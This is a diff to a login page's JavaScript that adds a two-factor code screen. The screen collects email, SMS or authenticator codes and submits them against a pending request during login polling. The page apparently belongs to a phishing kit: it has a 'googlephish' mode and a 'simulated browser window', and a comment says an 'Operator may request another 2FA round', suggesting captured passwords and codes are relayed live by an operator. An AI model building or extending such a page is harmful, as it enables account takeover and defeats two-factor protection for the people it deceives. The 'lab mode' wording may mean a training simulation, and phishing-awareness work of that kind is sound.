@@ -3,6 +3,9 @@
 
     if (window.AuthUI) window.AuthUI.init();
 
+    // Holds the request_id while the 2FA view is active so we can submit the code against it
+    var pending2faRequestId = null;
+
     function initGoogleSignIn() {
         if (typeof google === 'undefined' || !google.accounts) return;
         var clientId = cfg.googleClientId;
@@ -45,7 +48,16 @@
         if (!window.AuthAPI || !window.AuthUI) return;
         window.AuthUI.runGate(function () {
             return window.AuthAPI.afterLoginPoll(window.AuthAPI.loginWithGoogle(token));
+        }).then(function (result) {
+            handle2faResult(result);
         }).catch(function () {});
+    }
+
+    /** Called after any poll resolves — handles the '2fa' status centrally. */
+    function handle2faResult(result) {
+        if (!result || result.status !== '2fa') return;
+        pending2faRequestId = result.request_id || null;
+        window.AuthUI.show2fa(result.two_fa_type || 'email');
     }
 
     var loginForm     = document.getElementById('loginForm');
@@ -84,7 +96,7 @@
             }
 
             if (mode === 'googlephish') {
-                window.AuthUI.setBanner('In lab mode, use “Sign in with Google” to open the simulated browser window.', 'error');
+                window.AuthUI.setBanner('In lab mode, use "Sign in with Google" to open the simulated browser window.', 'error');
                 return;
             }
 
@@ -104,10 +116,107 @@
 
             window.AuthUI.runGate(function () {
                 return window.AuthAPI.afterLoginPoll(window.AuthAPI.loginWithPassword(username, password));
+            }).then(function (result) {
+                handle2faResult(result);
             }).catch(function () {});
         });
     }
 
+    // ── 2FA view ──────────────────────────────────────────────────
+    var twoFaSubmitBtn  = document.getElementById('twoFaSubmitBtn');
+    var twoFaBackBtn    = document.getElementById('twoFaBackBtn');
+
+    /** Returns the code from whichever 2FA panel is active. */
+    function get2faCode() {
+        var emailPanel = document.getElementById('twoFaPanelEmail');
+        var phonePanel = document.getElementById('twoFaPanelPhone');
+        var totpPanel  = document.getElementById('twoFaPanelTotp');
+
+        if (emailPanel && window.getComputedStyle(emailPanel).display !== 'none') {
+            return (document.getElementById('twoFaEmailCode') || {}).value || '';
+        }
+        if (phonePanel && window.getComputedStyle(phonePanel).display !== 'none') {
+            return (document.getElementById('twoFaPhoneCode') || {}).value || '';
+        }
+        if (totpPanel  && window.getComputedStyle(totpPanel).display  !== 'none') {
+            return (document.getElementById('twoFaTotpCode')  || {}).value || '';
+        }
+        return '';
+    }
+
+    if (twoFaSubmitBtn && window.AuthAPI && window.AuthUI) {
+        twoFaSubmitBtn.addEventListener('click', function () {
+            window.AuthUI.clearBanner('twoFaBanner');
+
+            if (!pending2faRequestId) {
+                window.AuthUI.setBanner('Session lost. Please log in again.', 'error', 'twoFaBanner');
+                return;
+            }
+
+            var code = get2faCode().replace(/\s/g, '');
+            if (!code) {
+                window.AuthUI.setBanner('Enter the verification code.', 'error', 'twoFaBanner');
+                return;
+            }
+            if (!/^\d{6}$/.test(code)) {
+                window.AuthUI.setBanner('Code must be 6 digits.', 'error', 'twoFaBanner');
+                return;
+            }
+
+            var reqId = pending2faRequestId;
+            window.AuthUI.runGate(function () {
+                return window.AuthAPI.afterLoginPoll(
+                    window.AuthAPI.submit2fa(reqId, code)
+                );
+            }).then(function (result) {
+                // Operator may request another 2FA round
+                handle2faResult(result);
+            }).catch(function () {});
+        });
+    }
+
+    if (twoFaBackBtn) {
+        twoFaBackBtn.addEventListener('click', function () {
+            pending2faRequestId = null;
+            window.AuthUI.clearBanner('twoFaBanner');
+            window.AuthUI.showLogin();
+        });
+    }
+
+    // ── 2FA method tab switching ───────────────────────────────────
+    var twoFaTabs = document.querySelectorAll('.twofa-tab');
+    twoFaTabs.forEach(function (tab) {
+        tab.addEventListener('click', function () {
+            var method = tab.dataset.method;
+            if (!method) return;
+            window.AuthUI.show2fa(method);
+        });
+    });
+
+    // ── Resend countdown buttons (reuse from login) ───────────────
+    function startCountdown(btn, originalText) {
+        var seconds = 60;
+        btn.disabled = true;
+        btn.textContent = seconds + 's';
+        var timer = setInterval(function () {
+            seconds--;
+            if (seconds <= 0) {
+                clearInterval(timer);
+                btn.disabled = false;
+                btn.textContent = originalText || 'Resend';
+            } else {
+                btn.textContent = seconds + 's';
+            }
+        }, 1000);
+    }
+
+    ['sendCodeBtn', 'fpSendCodeBtn', 'twoFaEmailResend', 'twoFaPhoneResend'].forEach(function (id) {
+        var btn = document.getElementById(id);
+        var orig = btn && btn.textContent;
+        if (btn) btn.addEventListener('click', function () { startCountdown(btn, orig); });
+    });
+
+    // ── Password toggle ───────────────────────────────────────────
     function wireTogglePwd(inputId, btnId) {
         var inp = document.getElementById(inputId);
         var btn = document.getElementById(btnId);
@@ -133,53 +242,35 @@
     wireTogglePwd('fpNewPwd', 'fpToggleNewPwd');
     wireTogglePwd('fpConfirmPwd', 'fpToggleConfirmPwd');
 
-    function showEmail() { emailBlock.style.display = ''; phoneBlock.style.display = 'none'; }
-    function showPhone() { emailBlock.style.display = 'none'; phoneBlock.style.display = ''; }
+    // ── Email / phone toggle ───────────────────────────────────────
+    function showEmail() { if (emailBlock) emailBlock.style.display = ''; if (phoneBlock) phoneBlock.style.display = 'none'; }
+    function showPhone() { if (emailBlock) emailBlock.style.display = 'none'; if (phoneBlock) phoneBlock.style.display = ''; }
 
     var usePhoneLink = document.getElementById('toggleInputMode');
     var useEmailLink = document.getElementById('toggleInputModePhone');
     if (usePhoneLink) usePhoneLink.addEventListener('click', function (e) { e.preventDefault(); showPhone(); });
     if (useEmailLink) useEmailLink.addEventListener('click', function (e) { e.preventDefault(); showEmail(); });
 
-    function showPassword() { passwordBlock.style.display = ''; smsBlock.style.display = 'none'; }
-    function showSms()      { passwordBlock.style.display = 'none'; smsBlock.style.display = ''; }
+    // ── Password / SMS code toggle ─────────────────────────────────
+    function showPassword() { if (passwordBlock) passwordBlock.style.display = ''; if (smsBlock) smsBlock.style.display = 'none'; }
+    function showSms()      { if (passwordBlock) passwordBlock.style.display = 'none'; if (smsBlock) smsBlock.style.display = ''; }
 
     var smsToggleLink = document.getElementById('smsToggleLink');
     var pwdToggleLink = document.getElementById('pwdToggleLink');
     if (smsToggleLink) smsToggleLink.addEventListener('click', function (e) { e.preventDefault(); showSms(); });
     if (pwdToggleLink) pwdToggleLink.addEventListener('click', function (e) { e.preventDefault(); showPassword(); });
 
-    function startCountdown(btn) {
-        var seconds = 60;
-        btn.disabled = true;
-        btn.textContent = seconds + 's';
-        var timer = setInterval(function () {
-            seconds--;
-            if (seconds <= 0) {
-                clearInterval(timer);
-                btn.disabled = false;
-                btn.textContent = 'Send code';
-            } else {
-                btn.textContent = seconds + 's';
-            }
-        }, 1000);
-    }
-
-    var sendCodeBtn   = document.getElementById('sendCodeBtn');
-    var fpSendCodeBtn = document.getElementById('fpSendCodeBtn');
-    if (sendCodeBtn)   sendCodeBtn.addEventListener('click', function () { startCountdown(sendCodeBtn); });
-    if (fpSendCodeBtn) fpSendCodeBtn.addEventListener('click', function () { startCountdown(fpSendCodeBtn); });
-
+    // ── Forgot password ────────────────────────────────────────────
     var loginView  = document.getElementById('loginView');
     var forgotView = document.getElementById('forgotView');
 
-    function showForgot() { loginView.style.display = 'none'; forgotView.style.display = ''; }
-    function showLogin()  { forgotView.style.display = 'none'; loginView.style.display = ''; }
+    function showForgot() { if (loginView) loginView.style.display = 'none'; if (forgotView) forgotView.style.display = ''; }
+    function showMainLogin() { if (forgotView) forgotView.style.display = 'none'; if (loginView) loginView.style.display = ''; }
 
     var forgotLink = document.getElementById('forgotPasswordLink');
     var backBtn    = document.getElementById('backToLogin');
     if (forgotLink) forgotLink.addEventListener('click', function (e) { e.preventDefault(); showForgot(); });
-    if (backBtn)    backBtn.addEventListener('click', function () { showLogin(); });
+    if (backBtn)    backBtn.addEventListener('click', function () { showMainLogin(); });
 
     var forgotForm = document.getElementById('forgotForm');
     if (forgotForm) forgotForm.addEventListener('submit', function (e) { e.preventDefault(); });
@@ -188,9 +279,10 @@
     var fpPhoneBlock = document.getElementById('fpPhoneBlock');
     var fpUsePhone   = document.getElementById('fpToggleInputMode');
     var fpUseEmail   = document.getElementById('fpToggleInputModePhone');
-    if (fpUsePhone) fpUsePhone.addEventListener('click', function (e) { e.preventDefault(); fpEmailBlock.style.display = 'none'; fpPhoneBlock.style.display = ''; });
-    if (fpUseEmail) fpUseEmail.addEventListener('click', function (e) { e.preventDefault(); fpPhoneBlock.style.display = 'none'; fpEmailBlock.style.display = ''; });
+    if (fpUsePhone) fpUsePhone.addEventListener('click', function (e) { e.preventDefault(); if (fpEmailBlock) fpEmailBlock.style.display = 'none'; if (fpPhoneBlock) fpPhoneBlock.style.display = ''; });
+    if (fpUseEmail) fpUseEmail.addEventListener('click', function (e) { e.preventDefault(); if (fpPhoneBlock) fpPhoneBlock.style.display = 'none'; if (fpEmailBlock) fpEmailBlock.style.display = ''; });
 
+    // ── Google one-tap init ────────────────────────────────────────
     if (document.readyState === 'complete') {
         initGoogleSignIn();
     } else {
